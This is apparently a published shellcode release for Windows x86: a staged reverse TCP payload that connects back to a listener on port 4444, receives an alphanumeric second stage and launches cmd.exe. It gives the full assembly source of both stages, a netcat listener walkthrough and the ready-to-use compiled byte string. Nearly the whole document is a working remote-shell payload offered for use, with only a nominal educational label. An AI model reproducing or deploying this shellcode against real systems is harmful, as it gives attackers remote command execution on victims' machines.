########### Windows x86 Reverse TCP Staged Alphanumeric Shellcode CreateProcessA cmd.exe ########
            ########### Author: Snir Levi, Applitects #############
								## 332 Bytes ##
					## For Educational Purposes Only ##

Date: 01.03.17
Author: Snir Levi
Email: snircontact@gmail.com
https://github.com/snir-levi/

IP -    127.0.0.1
PORT -  4444

Tested on:
Windows 7
Windows 10
											###Usage###
				Victim Executes the first stage shellcode, and opens tcp connection
				After Connection is established, send the Alphanumeric stage to the connection

				nc -lvp 4444
				connect to [127.0.0.1] from localhost [127.0.0.1] (port)
				RPhoceshtePrhCreaTQPXLLLLLLLLYFFFFPXNNNNj0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPhessAhProchExitTQPXFFFFFFFFPXZZZZZZZZZZj0YIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIITXQQQQWWWQQBRQQQQQQQQQQjDTZhexeChcmd.TYPRj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRRRBRJRRQRAAAAAAANNNNS

				Microsoft Windows [Version 10.0.14393]
				(c) 2016 Microsoft Corporation. All rights reserved.

				C:\Users\>
											###########



##Shellcode##


#### Second Stage Alphanumeric shellcode: #####

RPhoceshtePrhCreaTQPXLLLLLLLLYFFFFPXNNNNj0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPhessAhProchExitTQPXFFFFFFFFPXZZZZZZZZZZj0YIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIITXQQQQWWWQQBRQQQQQQQQQQjDTZhexeChcmd.TYPRj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRRRBRJRRQRAAAAAAANNNNS


R		push edx
P		push eax
hoces 	push 0x7365636f //oces
htePr	push 0x72506574	//tePr
hCrea	push 0x61657243	//Crea
T		push esp
Q		push ecx
PX		will be replaced with call [esi] (0x16ff)
L*8		dec esp // offset esp to kernel32.dll Address
Y		pop ecx // ecx = kernel32
F*4		inc esi -> offset [esi+4]
PX		will be replaced with mov [esi],eax (0x0689)
N*4		dec esi -> offset [esi]
j0		push 0x30
X		pop eax
H*48	dec eax  // zeroing eax
P		push eax
hessA	push 0x41737365 //essA (will be null terminated)
hProc	push 0x636f7250 //Proc
hExit	push 0x74697845	//Exit
T		push esp
Q		push ecx
PX		will be replaced with call [esi] (0x16ff)
F*8		inc esi -> offset [esi+8]
PX		will be replaced with mov [esi],eax (0x0689)
Z*10	offset stack to &processinfo
j0		push 0x30
Y		pop ecx
I*48	dec ecx  // zeroing ecx
T		push esp
X		pop eax	 //eax = &PROCESS_INFORMATION
Q*4		push ecx //sub esp,16
W		push edi
W		push edi
W		push edi
Q		push ecx
Q		push ecx
B		inc edx
R		push edx
Q*10 	push ecx
jD		push 0x44
T		push esp
Z		pop edx  //edx = &STARTUPINFOA
hexeC	push 0x65
hcmd.	push 0x78652e64
T		push esp // &'cmd.exe'
Y		pop ecx
P		push eax // &PROCESS_INFORMATION
R		push edx // &STARTUPINFOA
j0		push 0x30
Z		pop edx
J*48	dec edx // zeroing edx
R*3		push edx
B		inc edx
R		push edx
J		dec edx
R*2		push edx
Q		push ecx ; &'cmd.exe'
R		push edx
A*7		inc ecx	//offset ecx to [C]exeh -> will be null terminated
N*4		dec esi //offset [esi+4] to CreateProccesA
S		push ebx ; return address



## First Stage Shellcode ##


global _start

section .text


_start:
	xor eax,eax
	push eax ; null terminator for createProcA

	mov eax,[fs:eax+0x30] ; Proccess Enviroment Block
	mov eax,[eax+0xc]
	mov esi,[eax+0x14]
	lodsd
	xchg esi,eax
	lodsd
	mov ebx,[eax+0x10] ; kernel32

	mov ecx,[ebx+0x3c] ; DOS->elf_anew
	add ecx, ebx; Skip to PE start
	mov ecx, [ecx+0x78] ; offset to export table
	add ecx,ebx ; kernel32 image_export_dir

	mov esi,[ecx+0x20] ; Name Table
	add esi,ebx

	xor edx,edx

	getProcAddress:
		inc edx
		lodsd
		add eax,ebx
		cmp dword [eax],'GetP'
		jne getProcAddress
		cmp dword [eax+4],'rocA'
		jne getProcAddress

	;---Function Adresses Chain----
	;[esi]		GetProcAddress
	;[esi+12]	WSAstartup
	;[esi+16]	WSASocketA
	;[esi+20]	connect
	;[esi+24]	recv
	;[esi+28]	kernel32

	;Alphanumeric stage store:
	;[esi+4]	CreateProcessA
	;[esi+8]	ExitProccess


	mov esi,[ecx+0x1c] ; Functions Addresses Chain
	add esi,ebx
	mov edx,[esi+edx*4]
	add edx,ebx ; GetProcAddress

	sub esp, 32 ; Buffer for the function addresses chain
	push esp
	pop esi
	mov [esp],edx ; esi offset 0 -> GetProcAddress
	mov [esi+28],ebx ;esi offset 28 -> kernel32

	;--------winsock2.dll Address--------------
	xor edi,edi
	push edi
	push 0x41797261 ; Ayra
	push 0x7262694c ; rbiL
	push 0x64616f4c ; daoL
	push esp
	push ebx

	call [esi]

	;-----ws2_32.dll Address-------
	xor ecx,ecx
	push ecx
	mov cx, 0x3233   ; 0023
	push ecx
	push 0x5f327377  ; _2sw
	push esp

	call eax
	mov ebp,eax ;ebp = ws2_32.dll

	;-------WSAstartup Address-------------
	xor ecx,ecx
	push ecx
	mov cx, 0x7075      ; 00up
    push ecx
    push 0x74726174     ; trat
    push 0x53415357     ; SASW
	push esp
	push ebp

	call [esi]
	mov [esi+12],eax ;esi offset 12 -> WSAstartup

	;-------WSASocketA Address-------------
	xor ecx,ecx
	push ecx
	mov cx, 0x4174 ; 00At
	push ecx
	push 0x656b636f ; ekco
	push 0x53415357 ; SASW
	push esp
	push ebp

	call [esi]
	mov [esi+16],eax;esi offset 16 -> WSASocketA

	;------connect Address-----------
	push edi
	mov ecx, 0x74636565 ; '\0tce'
	shr ecx, 8
	push ecx
	push 0x6e6e6f63     ; 'nnoc'
	push esp
	push ebp

	call [esi]
	mov [esi+20],eax;esi offset 20 -> connect

	;------recv Address-------------
	push edi
	push 0x76636572 ;vcer
	push esp
	push ebp

	call [esi]
	mov [esi+24],eax;esi offset 24 -> recv

	;------call WSAstartup()----------
	xor ecx,ecx
	sub sp,700
	push esp
	mov cx,514
	push ecx
	call [esi+12]

	;--------call WSASocket()-----------
	; WSASocket(AF_INET = 2, SOCK_STREAM = 1,
	; IPPROTO_TCP = 6, NULL,
	;(unsigned int)NULL, (unsigned int)NULL);

	push eax ; if successful, eax = 0
	push eax
	push eax
	mov al,6
	push eax
	mov al,1
	push eax
	inc eax
	push eax

	call [esi+16]
	xchg eax, edi	; edi = SocketRefernce


	;--------call connect----------

	;struct sockaddr_in {
    ;   short   sin_family;
    ;   u_short sin_port;
    ;   struct  in_addr sin_addr;
    ;   char    sin_zero[8];
	;};


	push byte 0x1
    pop edx
    shl edx, 24
    mov dl, 0x7f    ;edx = 127.0.0.1 (hex)
	push edx
	push word 0x5c11; port 4444
	push word 0x2

	;int connect(
	;_In_ SOCKET                s,
	;_In_ const struct sockaddr *name,
	;_In_ int                   namelen
	;);

	mov edx,esp
	push byte 16 ; sizeof(sockaddr)
	push edx ; (sockaddr*)
	push edi ; socketReference

	call [esi+20]


	;--------call recv()----------

	;int recv(
	;_In_  SOCKET s,
	;_Out_ char   *buf,
	;_In_  int    len,
	;_In_  int    flags
	;);


stage:
	push eax
	mov ax,950
	push eax	;buffer length
	push esp
	pop ebp
	sub ebp,eax ; set buffer to [esp-950]
	push ebp	;&buf
	push edi	;socketReference

	call [esi+24]

executeStage:
	xor edx,edx
	mov byte [ebp+eax-1],0xc3	; end of the Alphanumeric buffer -> ret
	mov byte [ebp+96],dl ; null terminator to ExitProcess
	mov byte [ebp-1],0x5b ; buffer start: pop ebx -> return address
	dec ebp
	mov word [ebp+20],0x16ff ; call DWORD [esi]
	mov word [ebp+35],0x0689 ; mov [esi],eax
	mov word [ebp+110],0x16ff; call DWORD [esi]
	mov word [ebp+120],0x0689; mov [esi],eax
	mov ax,0x4173 ; As (CreateProcessA)
	mov ecx,[esi+28] ; ecx = kernel32
	dec dl ;edx = 0x000000ff
	call ebp ; Execute Alphanumeric stage
executeShell:
	mov [ecx],dl	;null terminator to 'cmd.exe'
	call dword [esi] ;createProcA
	push eax
	call dword [esi+4] ; ExitProccess



	-----------------------

unsigned char shellcode[]=
"\x31\xc0\x50\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x4b\x3c\x01\xd9\x8b\x49\x78\x01\xd9\x8b\x71\x20\x01\xde\x31\xd2\x42\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x8b\x71\x1c\x01\xde\x8b\x14\x96\x01\xda\x83\xec\x20\x54\x5e\x89\x14\x24\x89\x5e\x1c\x31\xff\x57\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\x16\x31\xc9\x51\x66\xb9\x33\x32\x51\x68\x77\x73\x32\x5f\x54\xff\xd0\x89\xc5\x31\xc9\x51\x66\xb9\x75\x70\x51\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x55\xff\x16\x89\x46\x0c\x31\xc9\x51\x66\xb9\x74\x41\x51\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x55\xff\x16\x89\x46\x10\x57\xb9\x65\x65\x63\x74\xc1\xe9\x08\x51\x68\x63\x6f\x6e\x6e\x54\x55\xff\x16\x89\x46\x14\x57\x68\x72\x65\x63\x76\x54\x55\xff\x16\x89\x46\x18\x31\xc9\x66\x81\xec\xf4\x01\x54\x66\xb9\x02\x02\x51\xff\x56\x0c\x50\x50\x50\xb0\x06\x50\xb0\x01\x50\x40\x50\xff\x56\x10\x97\x6a\x01\x5a\xc1\xe2\x18\xb2\x7f\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\x6a\x10\x52\x57\xff\x56\x14\x50\x66\xb8\xb6\x03\x50\x54\x5d\x29\xc5\x55\x57\xff\x56\x18\x31\xd2\xc6\x44\x05\xff\xc3\x88\x55\x60\xc6\x45\xff\x5b\x4d\x66\xc7\x45\x14\xff\x16\x66\xc7\x45\x23\x89\x06\x66\xc7\x45\x6e\xff\x16\x66\xc7\x45\x78\x89\x06\x66\xb8\x73\x41\x8b\x4e\x1c\xfe\xca\xff\xd5\x88\x11\xff\x16\x50\xff\x56\x04";